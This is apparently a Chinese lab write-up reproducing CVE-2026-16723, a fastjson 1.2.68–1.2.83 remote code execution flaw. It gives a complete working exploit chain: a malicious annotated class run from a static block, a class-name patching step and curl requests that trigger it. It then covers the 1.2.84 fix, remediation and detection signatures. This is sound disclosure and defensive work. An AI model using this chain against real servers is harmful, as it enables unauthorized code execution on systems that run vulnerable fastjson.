---
title: CVE-2026-16723 复现总结
date: 2026-11-09
description: fastjson 1.2.68 ~ 1.2.83的漏洞，
---
**简单说明该漏洞成因**：Fastjson 在判断 `@type` 是否可信时，把用户可控的这个字符串当作“资源名”交给 `URLClassLoader` 读取——由于 `URLClassLoader` 会把它当成 URL 打开，攻击者写一个 `jar:file:` 路径就能让目标加载自己提供的类，类的静态代码块随即可执行

**简单说明怎么利用的**：一句话：**在目标磁盘上放一个“加了 `@JSONType` 注解、静态块里写命令”的 jar，然后发一个 `@type` 指向它的 JSON**。

四步：

**1. 写一个类**

```java
@JSONType                                    // ← 白名单通行证，必须有
public class Evil {
    static {                                 // ← 类初始化时自动执行
        new ProcessBuilder("calc.exe").start();
    }
}
```

**2. 编译并改名，打成 jar**

```bash
javac --release 8 -cp fastjson-1.2.83.jar -d . Evil.java
python patch_name.py Evil.class 'jar:file:/C:/fj/f!/Evil' Evil.class   # 改 this_class
jar cf payload.jar Evil.class && cp payload.jar /c/fj/f
```

改名是因为 JVM 要求“请求的类名”和 class 自己声明的名字逐字相同，而 fastjson 传进去的是 `jar:file:/C:/fj/f!/Evil` 这种带 `:` `!` 的名字。

**3. 让这个 jar 落到目标机器上**（上传接口、临时目录、共享缓存都行；演示时直接放 `C:\fj\f`）

**4. 发一个请求**

```bash
curl -X POST http://target/parse -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.C:.fj.f!.Evil"}'
```

注意 `@type` 里用**点代替斜杠**，因为 fastjson 会把点换成 `/`，还原后正好是 `jar:file:/C:/fj/f`。

然后目标 JVM 就会：把这个字符串当 URL 打开 → 读到你的 class → 扫到 `@JSONType` 判定可信 → `defineClass` 定义它 → `<clinit>` 执行 → 弹出计算器。

**判断成功别看返回体**，看副作用：计算器进程、证明文件的 mtime。`ok:true` 只代表“类加载成功”，同一个类名第二次打会命中缓存、不会重新执行。

**唯一的前提**（也是唯一要说清的限制）：第 3 步的 jar 必须先到目标磁盘上。远程 `jar:http://` 打不到 `defineClass`，因为类名里会出现 `//`，JVM 直接拒绝。
<!-- more -->
# CVE-2026-16723 复现总结

fastjson 1.2.68 ~ 1.2.83 · 默认配置反序列化 RCE · CVSS 9.0 · 1.2.84 修复

> 本文所有结论都在本机（Windows 10 / JDK 8u66）与 Ubuntu 虚机（JDK 17）上实测过，
> 报错原文、字节数、返回字段均为实测值，不是从公告里抄的。

**阅读顺序**：前置（要准备什么）→ 1（这洞是什么、凭什么能打）→ 2（payload 怎么造）→ 3（怎么一步步复现）。

---

# 前置：复现这个漏洞需要什么

## 0.1 一句话

**一台能跑 Java 的机器 + 一个用漏洞版本 fastjson 的 Web 应用 + 一个按目标路径定制好的 class 文件。**
不需要外网、不需要 Docker、不需要数据库、不需要中间件、不需要任何 gadget。

## 0.2 软硬件清单

| 项目 | 要求 | 说明 |
|---|---|---|
| 操作系统 | Windows 10/11 或 Ubuntu 20.04+ | 两条路都实测打通 |
| JDK | 8 / 11 / 17 / 21 任一 | 实测 8u66、17.0.20、21.0.10 均可 |
| 内存 | 512 MB 空闲 | 应用本体是 18 MB 的 fat-JAR |
| 编译工具 | 任一 `javac` + `jar` | 必须支持 `--release 8`；JDK 21 的 javac 也行 |
| 运行时工具 | `curl`；`python3`（改类名用） | Ubuntu 缺 curl：`sudo apt install curl` |
| 外网 | **不需要** | 全程走 `127.0.0.1` |
| Docker / 数据库 / MQ | **不需要** | 裸 JVM 直接跑 |

## 0.3 四个技术前提（缺一不可）

| # | 前提 | 怎么确认 | 不满足的表现 |
|---|---|---|---|
| 1 | fastjson 在 **1.2.68 ~ 1.2.83** | `mvn dependency:tree \| grep fastjson` | 1.2.84+ 直接 `autoType is not support` |
| 2 | 默认 classloader 是 **`URLClassLoader` 家族** | `/status` 的 `launchedBy` 字段 | `stream=false`，链断在读取第一步 |
| 3 | **没开 SafeMode**，不是 `noneautotype` 构建 | `/status` 的 `safeMode` 字段 | 探测请求都发不出去 |
| 4 | 有接口把请求体交给 **`JSON.parse`** | 看业务代码 | 根本进不了 `checkAutoType` |

**第 2 条是绝大多数复现失败的真正原因。** Spring Boot fat-JAR 的 `LaunchedURLClassLoader` 是 `URLClassLoader` 子类，`java -jar` 启动天然满足；但某些部署形态拿到的是普通 `AppClassLoader`，同一个 payload 就是 `stream=false`。

## 0.4 需要准备的四个文件

| 文件 | 作用 | 本项目位置 |
|---|---|---|
| 靶场应用（漏洞版） | 被打的那一方 | `out/app-vuln-1.2.83.jar` |
| payload 的 Java 源码 | 要执行的代码 | `payload/windows/Evil.java` |
| 改类名脚本 | 让 class 自称 `jar:file:.../Evil` | `payload/patch_name.py` |
| 对照应用（修复版） | 证明"同一 payload 打不动" | `out/app-fixed-1.2.84.jar` |

## 0.5 这些都不需要（常见误解）

- 不需要 `autoTypeSupport=true`——默认 `false` 照样打穿，这是本漏洞最反直觉的地方；
- 不需要 classpath 上有 CommonsCollections / JdbcRowSetImpl 之类 gadget；
- 不需要目标能出网——`jar:file:` 形态完全离线；
- 不需要 `/proc/self/fd`——那是"jar 只存在于进程 fd 上"时的补充路径，本次未用到。

## 0.6 三种部署形态，三种能力

| 形态 | 环境要求 | 能做到 |
|---|---|---|
| 单机自打 | 一台机器 | 全链贯通，代码执行 |
| 跨机（攻击机 + 靶机同网段） | 靶机端口可达 | 全链贯通，效果最真实 |
| 纯远程（只有 HTTP 可达） | 无需接触目标磁盘 | 只能到 SSRF + 信任伪造，**打不到 `defineClass`** |

第三种形态的天花板是漏洞本身决定的，第 1.4 节解释原因。

---

# 1. 这个漏洞是什么

## 1.1 一条 JSON 变成代码执行

正常反序列化请求：

```json
{"name":"tom","age":18}
```

fastjson 允许在 JSON 里写 `@type`，声明"这段数据还原成哪个类"：

```json
{"@type":"com.example.User","name":"tom"}
```

问题就在这个 `@type` 上。它语义上应该是**一个类名**，但 fastjson 在处理它之前会先拿这个字符串去**查"有没有对应的 class 文件"**，用来判断类型是否可信。

而这个"查"用的是 `ClassLoader.getResourceAsStream(name)`。对 `URLClassLoader` 来说，`name` 不一定是类路径，**它可以是 URL**。

于是：

```json
{"@type":"jar:file:.C:.fj.f!.Evil"}
```

目标进程会去打开 `jar:file:/C:/fj/f`，取出里面 `Evil.class` 的字节，用 ASM 扫到 `@JSONType` 注解，判定"这是可信类型"，然后定义它、实例化它——**静态初始化块随之执行，代码就跑起来了。**

## 1.2 与 1.2.68 之前漏洞的最大区别

fastjson 的漏洞史可以一刀切成两段，分界线正好是 **1.2.68**，也就是本漏洞的引入版本。

| 维度 | ≤ 1.2.67（AutoType 绕过家族） | 1.2.68 ~ 1.2.83（本漏洞） |
|---|---|---|
| 漏洞性质 | 检查逻辑被**绕过**（bypass） | 检查逻辑被**当成加载器使用**（injection） |
| 攻击者要解决的问题 | 找一个 classpath 上已有、且能触发危险动作的类 | 自己写一个类，不需要任何 gadget |
| 攻击者控制的对象 | **选哪个类**（类名只是数据） | **类的内容本身**（类名即路径，jar 即载荷） |
| 默认配置 | 多数要 `autoTypeSupport=true`；少数靠缓存绕过可在默认下打 | 默认配置即可，实测 `autoTypeSupport=false` 照样打穿 |
| 第三方依赖 | 依赖 gadget 在 classpath（`JdbcRowSetImpl`、`TemplatesImpl`，或 mybatis、xbean、shiro 等） | 零依赖，JDK 自带即可 |
| 出网要求 | JNDI 类要求目标能回连攻击者的 LDAP/RMI | 完全不出网（`jar:file:` 本地路径） |
| JDK 限制 | `TemplatesImpl` 受 JDK 版本/模块限制，高版本常失效 | class 版本对齐即可，实测 8u66 / 17 / 21 均可 |
| CVE 形态 | **点版本**：1.2.42、1.2.47……每个版本一个绕过 | **区间**：同一个设计缺陷贯穿 1.2.68 ~ 1.2.83 |
| 修复手段 | 逐个加黑名单、加缓存校验（1.2.25 → 1.2.67 打了十几轮） | 一个字符校验，4 行，拦 `:` 和 `!` |
| 流量特征 | `@type` 是已知 gadget 类名 | `@type` 里含 `:`、`!`、`..`、`jar:`、`http:` |

**三条更本质的差异：**

**① 载荷从"数据"变成"代码"。** 旧漏洞的 payload 是一段 JSON，它能做什么取决于**目标机器上装了什么**——同一段 JSON 打不同环境成功率天差地别，这也是旧漏洞"复现靠运气"的原因。本漏洞的 payload 是一个 class 文件，**代码由攻击者自己提供**，所以不挑环境、不出网、不挑 JDK。代价是多了个前置：jar 得先落到目标磁盘上。

**② CVE 形态从"点版本"变成"区间"。** 1.2.42、1.2.47 这些 CVE 对应的是"上一个补丁没打全"，所以每个版本一个编号、修完就没了。本漏洞是 1.2.68 引入的一段设计本身有问题，整段版本全部受影响——这也是它 CVSS 9.0 的原因：默认可打、无 gadget、无出网要求，三个传统门槛全被拆掉。

**③ 补丁从"加类名"变成"改语法"。** 旧漏洞的攻击面是"类的集合"，所以黑名单能堵，虽然堵得很累。本漏洞的攻击面是"字符串的语法"——`jar:file:`、`http:`、`../`、`/proc/self/fd`，路径写法无穷多，黑名单天然堵不住。所以 1.2.84 不是"再加几个类名"，而是**在入口拒绝非法字符**。

**历史脉络**（公开披露的代表性样本，不是完整列表）：1.2.24 及以前 AutoType 默认开启，`TemplatesImpl` / `JdbcRowSetImpl` 直打；1.2.25 关闭 AutoType 并引入黑名单，此后进入长期补丁战——1.2.25 ~ 1.2.41 的 `[` 前缀绕过、1.2.42 的 `L...;`、1.2.43 的 `LL...;;`、1.2.47 的 `java.lang.Class` 缓存投毒、1.2.55 ~ 1.2.67 的黑名单扩充。

**为什么 1.2.68 成了分界**：这个版本为了支持 `@JSONType` 自声明与 SafeMode，在 `checkAutoType` 里加了"读一下 class 文件、看有没有注解"的探测。设计初衷是让库作者自己标注可信类型，副作用却是把用户可控的 `@type` 变成了一个**能拼进 URL 的字符串**。修旧漏洞的过程中引入了新原语，这是防御代码最常见的翻车方式。

## 1.3 为什么能被利用：一行代码里的四个失误

漏洞本体在 `com.alibaba.fastjson.parser.ParserConfig.checkAutoType()`，1.2.83 的 1479–1498 行：

```java
1479  boolean jsonType = false;
1480  InputStream is = null;
1481  try {
1482      String resource = typeName.replace('.', '/') + ".class";
1483      if (defaultClassLoader != null) {
1484          is = defaultClassLoader.getResourceAsStream(resource);
1485      } else {
1486          is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
1487      }
1488      if (is != null) {
1489          ClassReader classReader = new ClassReader(is, true);
1490          TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
1491          classReader.accept(visitor);
1492          jsonType = visitor.hasJsonType();
1493      }
1494  } catch (Exception e) {
1495      // skip
1496  } finally {
1497      IOUtils.close(is);
1498  }
```

四个失误叠在一起，才构成可利用性：

1. **`typeName` 没做任何字符校验**，直接拼成资源名（1482）；
2. **把"资源查找"用在了语义上应该是"类名解析"的地方**——`getResourceAsStream` 对 `URLClassLoader` 等于"打开这个 URL"（1484）；
3. **信任判定只看 class 里有没有 `@JSONType` 注解，不看这个类从哪来**（1492）；
4. **异常被 `catch (Exception e) { // skip }` 静默吞掉**，业务侧完全无感（1494）。

第 4 点让整个探测阶段天然无声：目标已经替你访问了任意地址，日志里却什么都不会留。

**信任信号为什么能被伪造**（`asm/TypeCollector`，69–72 行）：

```java
public void visitAnnotation(String desc) {
    if (JSONType.equals(desc)) {
        jsonType = true;
    }
}
```

判定规则只有一条：**class 文件的注解表里出现 `Lcom/alibaba/fastjson/annotation/JSONType;` 这个描述符，就算"可信"**。攻击者在自己类头上写一个 `@JSONType`，等于给自己发了一张白名单通行证——`checkAutoType` 拿到 `jsonType=true` 后，在 1500 行的分支里直接 `return clazz`，AutoType 黑白名单完全不看。

**完整调用链**：

```
JSON.parse(body)
  └─ ParserConfig.checkAutoType("@type 的值")
       ├─ typeName.replace('.', '/') + ".class"
       ├─ defaultClassLoader.getResourceAsStream(...)      → URLClassLoader 当 URL 打开
       │    └─ SSRF / 读任意 jar 里的字节码
       ├─ TypeCollector 用 ASM 扫字节，看有没有 @JSONType   → 信任信号可伪造
       └─ TypeUtils.loadClass(typeName, loader, true)
            └─ URLClassLoader.findClass
                 └─ defineClass(typeName, bytes)            → 类被定义
                      └─ <clinit> 执行                      → 代码执行
```

## 1.4 能力边界：三种 `@type` 写法

直觉上"让目标去下载我服务器上的 jar"才是完整远程利用，但这条路有一道过不去的坎：

```text
@type        jar:http:..2130706433:19090.f!.Evil
   ↓ 点号换斜杠
请求的类名     jar:http://2130706433:19090/f!/Evil
                    ↑↑ 空包段
```

JVM 内部类名不允许出现空包段，`//` 直接导致：

```text
java.lang.ClassFormatError: Illegal class name "jar:http://2130706433:19090/f!/Evil"
```

而这个 `//` 去不掉——URL 的 `scheme://` 天然带两个斜杠。

| `@type` 写法 | 能做到 | 做不到 |
|---|---|---|
| `http://...` | SSRF，目标主动外连 | 其它任何事 |
| `jar:http://...!` | SSRF + 拉取并识别 `@JSONType`（信任伪造成立） | `defineClass`（类名非法） |
| `jar:file:/path/f!` | 全链贯通，代码执行 | —— |

**结论：这个洞的真实利用条件是"先让一个 jar 落到目标磁盘上"，再用 `jar:file:` 打。** 落地手段可能是上传功能、临时目录写入、共享缓存、日志投递等。汇报时不要省这一步，否则会被"哪来的一发 getshell"问住。

> `2130706433` 是 `127.0.0.1` 的十进制写法——因为 `@type` 里的点会被替换掉，凡是需要保留点的地址都得换成无点形式。

## 1.5 三个常见误解

| 误解 | 实际 |
|---|---|
| "要开 `autoTypeSupport=true` 才能打" | 不需要。默认 `false`，实测 `autoTypeSupport:false` 依然 `ok:true` |
| "要 classpath 上有 CommonsCollections 之类 gadget" | 不需要。要执行的代码由攻击者自己提供，不走链式调用 |
| "把入参类型写死成 DTO 就安全" | 不成立。DTO 里有 `Object` / `Map` / 泛型字段，payload 塞进去一样会走 `checkAutoType` |

---

# 2. payload 怎么构造

## 2.1 形态：一个 class，装在一个最小 jar 里

payload 不是脚本、不是 gadget 链，而是**一个自己写的 Java 类**，编译后打成最小的 jar：

```text
f                        ← 只有 1.6 KB 的 jar
├── Evil.class           ← 必须在 jar 根目录（默认包）
└── META-INF/MANIFEST.MF
```

为什么不直接用裸 class？因为 `@type` 要写成 `jar:file:...!/Evil` 这种形式，才能让 `URLClassLoader` 把"读取"和"类名"绑在一起——`!` 前面的部分是容器，后面的是容器内的路径。

## 2.2 类的内容

```java
import com.alibaba.fastjson.annotation.JSONType;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;

@JSONType                                    // ← 通行证，没有它后面全不成立
public class Evil {
    static {                                 // ← 执行点：类初始化时自动跑
        StringBuilder sb = new StringBuilder();
        sb.append("jvm-user : ").append(System.getProperty("user.name")).append("\n");
        sb.append("java     : ").append(System.getProperty("java.version")).append("\n");
        sb.append("loader   : ").append(Evil.class.getClassLoader()).append("\n");
        try {
            Process p = new ProcessBuilder("C:\\Windows\\System32\\calc.exe").start();
            sb.append("command  : calc.exe -> ").append(p).append("\n");
        } catch (Throwable ignored) { }
        try {
            Files.write(Paths.get("C:\\fj\\rce-proof.txt"),
                    sb.toString().getBytes(StandardCharsets.UTF_8));
        } catch (Throwable ignored) { }
    }
}
```

## 2.3 三处写法是强制的，不是风格选择

| 写法 | 原因 |
|---|---|
| `@JSONType` | 就是 1.3 那张"白名单通行证"，缺了它 `checkAutoType` 直接抛异常 |
| 干活写在 `static {}` | 类定义后、实例化前就会执行，是最稳的触发点，不依赖构造方法 |
| 不引用自己 jar 里的其它类 | 定义它的 loader 也负责找依赖，而依赖不在目标 classpath 上 |

## 2.4 五个硬约束

| # | 约束 | 违反了会怎样 |
|---|---|---|
| 1 | `@type` 里的 `.` 会被换成 `/`，所以**路径里不能有点** | `f.jar` → `f/jar`，路径错，`stream=false` |
| 2 | 类必须在**默认包**，jar 内路径要和 `@type` 还原后一致 | `stream=false`，探测阶段就失败 |
| 3 | `this_class` 必须逐字等于 `@type` 还原后的名字 | `NoClassDefFoundError ... (wrong name: Evil)` |
| 4 | 字节码版本 ≤ 目标 JVM | `UnsupportedClassVersionError`（现象和"没打通"几乎一样） |
| 5 | 类必须**自包含** | `NoClassDefFoundError: pwn/Pwn` |

两个隐含限制：`typeName.length() < 192`（1.2.83 入口就有这个判断）；类名里不能出现连续斜杠。

所以 **jar 文件名不能带点**（`f` 可以，`f.jar` 不行），也**不能放在子目录里**。

## 2.5 最关键的一步：改 `this_class`

这是整个复现里唯一的"门槛"，也是最容易被忽略的地方。

**JVM 有一条硬性校验**：

> `defineClass(name, bytes)` 里的 `name`，必须和 class 文件里 `this_class` 自称的名字**逐字相同**。

而 fastjson 传给 `defineClass` 的是 `@type` 的原始值（含 `:` 和 `!`），不是点号替换后的值。所以：

```text
@type                jar:file:.C:.fj.f!.Evil
   ↓ 1482 行点号换斜杠
实际请求的类名        jar:file:/C:/fj/f!/Evil
   ↓ JVM 要求 this_class 必须等于它
class 里必须写        jar:file:/C:/fj/f!/Evil      ← 原版 class 里是 "Evil"
```

不改的后果：

```text
java.lang.NoClassDefFoundError: jar:file:/C:/fj/f!/Evil (wrong name: Evil)
```

**这条报错是整条链上最有价值的反馈**：`wrong name` 说明 `defineClass` 已经被调到了、字节码已经进 JVM 了，只差最后一道命名校验。看到它，说明 SSRF、读取、注解识别全部成功。

更坑的是，这个真实异常在 `TypeUtils.loadClass` 里被 `catch (Throwable e) { e.printStackTrace(); }` 吞掉，业务侧只看到一句笼统的 `autoType is not support`。所以排查时必须绕开 fastjson 直接调 classloader——靶场的 `/rawload` 就是干这个的。

**改名的原理**：`this_class` 是常量池索引（`u2`），指向一条 `CONSTANT_Class`，那条再指向一条 `CONSTANT_Utf8`，真正的类名字节存在这里。

```text
magic            u4   CAFEBABE
major_version    u2   ← 52=Java 8，65=Java 21
constant_pool[]       ← 变长表
this_class       u2   ← 索引，不是字符串
```

所以只需要改那条 UTF-8 的内容，**其它索引全不用动**，字段、方法、注解表原样保留：

```text
改名前  this_class: #34    // Evil
改名后  this_class: #34    // "jar:file:/C:/fj/f!/Evil"
```

`payload/patch_name.py` 做的就是这件事：解析常量池（按 tag 决定每条占几字节，`long`/`double` 占两个槽位）→ 顺着 `Class → name_index` 找到 UTF-8 → 替换 → 重新拼装。

## 2.6 四步造出来

```bash
# 0) 准备目录
mkdir -p /c/fj/build && cd /c/fj/build

# 1) 编译（--release 8 是硬要求，否则目标 JDK 8 会 UnsupportedClassVersionError）
javac --release 8 -nowarn -cp <项目>/out/fastjson-1.2.83.jar \
      -d . <项目>/payload/windows/Evil.java

# 2) 改名：写 @type 点号还原后的名字，不是 @type 原样
python <项目>/payload/patch_name.py Evil.class \
  'jar:file:/C:/fj/f!/Evil' Evil.class

# 3) 打包（jar 命令要求输出名 ≥3 字符，先打成 payload.jar 再改名）
jar cf payload.jar Evil.class && cp payload.jar /c/fj/f

# 4) 校验
javap -v -p Evil.class | grep -E "this_class|major version"
```

第 4 步预期：

```text
major version: 52
this_class: #34                          // "jar:file:/C:/fj/f!/Evil"
```

`major version: 52` 是 Java 8 字节码，`this_class` 必须是 `@type` 还原后的完整名字。这两行对不上，后面一定失败。

---

# 3. 具体怎么复现

## 3.1 单机版（Windows，5 步）

**第 1 步：起靶场**

```bash
mkdir -p /c/fj && cd /c/fj
cp <项目>/out/app-vuln-1.2.83.jar app.jar
java -jar app.jar --server.port=18084 > app.log 2>&1 &
```

**第 2 步：环境自检**（这一步决定要不要继续）

```bash
curl -s http://127.0.0.1:18084/status; echo
```

```json
{"fastjsonVersion":"1.2.83","typeNameCheck":"absent (<=1.2.83)","safeMode":false,
 "autoTypeSupport":false,"javaVersion":"1.8.0_66",
 "launchedBy":"org.springframework.boot.loader.LaunchedURLClassLoader","vulnerable":true}
```

四个字段对上前提里的四条：`vulnerable:true`、`autoTypeSupport:false`（证明不用开 AutoType）、`launchedBy` 是 `LaunchedURLClassLoader`、`safeMode:false`。任何一个不符，先解决再往下。

**第 3 步：探测**（只读字节 + 扫注解，不定义类）

```bash
curl -s -G http://127.0.0.1:18084/debug --data-urlencode 'type=jar:file:.C:.fj.f!.Evil'; echo
```

```json
{"resource":"jar:file:/C:/fj/f!/Evil.class","stream":true,"bytes":2107,
 "jsonTypeDirect":true,"checkAutoType":"jar:file:.C:.fj.f!.Evil"}
```

`stream:true` 表示读到了字节，`bytes:2107` 正好是 class 长度，`jsonTypeDirect:true` 表示扫到了 `@JSONType`。这三个值说明前三段已经成立，只剩定义。

**第 4 步：触发**

```bash
curl -s -X POST http://127.0.0.1:18084/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.C:.fj.f!.Evil"}'; echo
```

```json
{"ok":true,"class":"jar:file:.C:.fj.f!.Evil","result":"jar:file:.C:.fj.f!.Evil@1e29ab1a"}
```

同时屏幕弹出计算器，`C:\fj\rce-proof.txt` 生成。

**第 5 步：确认副作用**（唯一可靠的判据）

```bash
cat /c/fj/rce-proof.txt
```

```text
CVE-2026-16723 windows repro - code executed
jvm-user : MECHREVO
java     : 1.8.0_66
loader   : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
command  : calc.exe -> java.lang.ProcessImpl@76fc7ec7
```

`loader` 这行证明代码跑在靶场那个 JVM 里，`command` 那行证明真的起了进程。**计算器的父进程就是 PID 27852 的 `java.exe`**，演示时可以当场用任务管理器指出来。

## 3.2 跨机器版（虚机当攻击机，本机当靶机）

更接近真实攻击，演示效果最好。本机靶场监听 `0.0.0.0:18084`，虚机通过 VMware NAT 网关 `192.168.244.1` 访问。

虚机里：

```bash
# 1) 先测连通（返回 JSON 就成了，注意 javaVersion 是宿主机的 1.8.0_66，不是虚机的 17）
curl -s -m 5 http://192.168.244.1:18084/status; echo

# 2) 直接打
curl -s -m 30 -X POST http://192.168.244.1:18084/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.C:.fj.g!.Evil"}'; echo
```

两个必须记住的点：

- **`@type` 里的路径是靶机的**，不是攻击机的。解析发生在宿主机 JVM，写虚机的 `/tmp/...` 一定 `stream=false`；
- **计算器弹在靶机桌面**（宿主机），虚机里只会看到 `ok:true`。

**关于防火墙**（实测结论，别被吓到）：Windows 防火墙默认不拦回环流量，出站默认放行，而入站的 `java.exe` 通常早就有放行规则（本机 `javapath\java.exe` 是指向 `C:\Program Files\Java\jre1.8.0_66` 的符号链接，该路径已有 Allow 规则）。所以**第 1 步能返回 JSON 就说明通**，不需要额外加规则。

只有当第 1 步超时才需要：

```powershell
New-NetFirewallRule -DisplayName "fjlab-18084" -Direction Inbound `
  -Protocol TCP -LocalPort 18084 -Action Allow -Profile Any
# 演示完删掉
Remove-NetFirewallRule -DisplayName "fjlab-18084"
```

要理解的是：**防火墙不是这条链的防线。** 它只决定"包能不能进来"，不决定"进来之后 JVM 做什么"。所以哪怕把入站全封了，本机 `127.0.0.1` 打自己依然能弹计算器。

## 3.3 对照：同一个 payload 打 1.2.84

这是把"漏洞利用"和"文件落地"区分开的最直接证据——**同一份 `C:\fj\f`、同一个请求体，只换 fastjson 版本**。

```bash
cd /c/fj
java -jar app-fixed.jar --server.port=18087 > fixed.log 2>&1 &
curl -s http://127.0.0.1:18087/status; echo
```

预期 `typeNameCheck` 变成 `present (1.2.84+)`。然后打：

```bash
rm -f /c/fj/rce-proof.txt
curl -s -m 20 -X POST http://127.0.0.1:18087/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.C:.fj.f!.Evil"}'; echo
```

| 实例 | `/status` | `/parse` | 计算器 | 证明文件 | 绕过 fastjson 直调 loader |
|---|---|---|---|---|---|
| 1.2.83 | `absent` | `ok:true` | 弹出 | 生成 | 可定义 |
| 1.2.84 | `present (1.2.84+)` | `autoType is not support` | 不弹 | **未生成** | **仍可定义** |

最后一行很关键：**classloader 的解析能力没变，修复只加在 fastjson 入口**。所以"换个 loader / 换个部署形态"不构成缓解，升级 + 出站管控才是。

> 判断是否已修复，**不要看 `JSON.VERSION`**——1.2.84 里这个常量仍然是 `"1.2.83"`。看依赖坐标，或看 `hasIllegalTypeNameChars` 方法在不在（`/status` 的 `typeNameCheck` 就是这么自查的）。

## 3.4 怎么判断成功：三层证据

这个漏洞里，HTTP 200 和 `ok:true` 都不可靠，好几个"成功"的步骤返回的恰恰是报错。

| 层次 | 看什么 | 说明 |
|---|---|---|
| 1. 命令跑没跑起来 | `echo $?` | `exit=0` 才说明命令本身没错；`28`=超时，`7`=端口没起 |
| 2. 动作有没有发生 | 端口监听、对方日志、进程树 | 证明链路走到哪一步 |
| 3. **有没有留下副作用** | 证明文件、计算器进程 | **唯一不会骗人的判据** |

每一段的判定点，以及那些"看起来失败、其实成功"的情况：

| 阶段 | 成功证据 | 假失败 |
|---|---|---|
| 起靶场 | `vulnerable:true` | 启动日志一大段，正常 |
| SSRF | 攻击者日志多出 `HEAD /probe.class` | 返回 `autoType is not support` 是预期的 |
| 读字节 | `stream=true`、`bytes` 非零 | `checkAutoTypeError` 有值，说明只到探测 |
| 改名前 | `/rawload` 报 `(wrong name: Evil)` | **这条报错是最好的消息** |
| 落地 | `ok:true` + 证明文件 + 进程存在 | —— |
| 1.2.84 对照 | `ok:false` + 证明文件不存在 | 这里的"失败"正是修复生效 |

## 3.5 失败排查表

| 现象 | 真实原因 | 处理 |
|---|---|---|
| `stream:false` | 路径不对：Linux 路径打在 Windows 上、jar 名带点、类不在默认包 | 用 `jar tf f` 看内部路径；确认 `@type` 点号还原后等于文件真实路径 |
| `stream:true` 但 `jsonTypeDirect:false` | 类上没写 `@JSONType`，或注解被 `RetentionPolicy` 限制 | `javap -v -p Evil.class \| grep -A2 RuntimeVisibleAnnotations` |
| `wrong name: Evil` | 没改 `this_class` | 跑 `patch_name.py`，再用 `javap` 校验 |
| `NoClassDefFoundError: pwn/Pwn` | 类不自包含 | 去掉对外部类的引用 |
| `UnsupportedClassVersionError` | 没用 `--release 8` | 重新编译 |
| `ClassFormatError: Illegal class name "jar:http://..."` | 用了远程形态 | 换 `jar:file:`，见 1.4 |
| `ok:true` 但什么都没发生 | 类名命中缓存，`<clinit>` 不再执行 | 换 jar 名（`f`→`g`）或重启靶场，见 3.6 |

## 3.6 类缓存陷阱（演示最容易翻车的地方）

同一个类名第二次打，会看到 `ok:true` 但**什么都不发生**。原因在 `TypeUtils.loadClass` 开头：

```java
Class<?> clazz = mappings.get(className);
if (clazz != null) return clazz;
```

第一次加载时类已经初始化过，`<clinit>` 不会再执行。所以：

- `ok:true` 只代表"类存在、实例创建成功"，**不代表代码刚刚又跑了一遍**；
- 演示时每打一次就换一个类名（`f` → `g` → `h`，每次重新 patch），或者重启靶场。

判断"这次到底执行没有"，看两个副作用：证明文件的 mtime、计算器进程数。

---

# 附录 A：修复与检测

## A.1 1.2.84 改了什么

`checkAutoType` 入口新增（`ParserConfig.java` 1363–1367）：

```java
// a URL-special type name can never be a class name; reject it here the same way any
// unresolvable @type is rejected, so it never reaches the class loader
if (TypeUtils.hasIllegalTypeNameChars(typeName)) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

```java
public static boolean hasIllegalTypeNameChars(String typeName) {
    return typeName.indexOf(':') >= 0 || typeName.indexOf('!') >= 0;
}
```

**为什么四行就够**：这个漏洞的每一种可达形态，都必须把 `jar:...!/...` 塞进 `@type`，而这种名字必然同时包含 `:` 和 `!`。在入口拒掉这两个字符，探测阶段就拿不到名字（**SSRF 一起被堵**），定义阶段也走不到 `defineClass`。

## A.2 修复优先级

1. 升 **1.2.84** 及以上维护版本；
2. 升不了就开 SafeMode：`-Dfastjson.parser.safeMode=true`（实测在探测之前就拒绝，PoC 端零请求）；
3. 换 `1.2.83_noneautotype` 构建；
4. 长期迁移 fastjson2（≥ 2.0.63）；
5. 配套：出站白名单（阻断回连）+ 禁止把请求体直接喂给 `JSON.parse`。

## A.3 检测特征

- `@type` 的值里同时出现 `:` 和 `!`，或出现 `jar:` / `http:` / `..` 组合；
- 应用进程对陌生地址发起 `GET` / `HEAD`，path 以 `.class` 结尾，UA 形如 `Java/1.17.0`；
- 日志出现类名式异常：`wrong name: ...`、`Illegal class name "jar:..."`；
- `/tmp` 出现小体积 jar，或应用进程拉起 `sh -c` / `cmd /c` 子进程；
- 进程内出现名字极不寻常的类（`jar:file:...` 这种类名在任何工具里都极其显眼）。

---

# 附录 B：边界与口径

仅用于自有环境 / 授权范围，靶场不要暴露公网。本套 payload 只做两件事：启动一个计算器、写一个证明文件；不含反弹 shell、不含持久化、不修改系统。

**汇报时建议主动标注的两点**：

1. 演示里 payload 是预先放在目标磁盘上的，模拟"攻击者已获得文件落地能力"（上传、临时目录等真实途径），不是凭一个请求凭空达成；
2. 远程 `jar:http://` 形态受 JVM 类名校验限制，只能做到 SSRF + 信任伪造，落地必须走本地路径。

把这两点讲清楚，比"一个请求 getshell"更有说服力，也不容易被现场问倒。
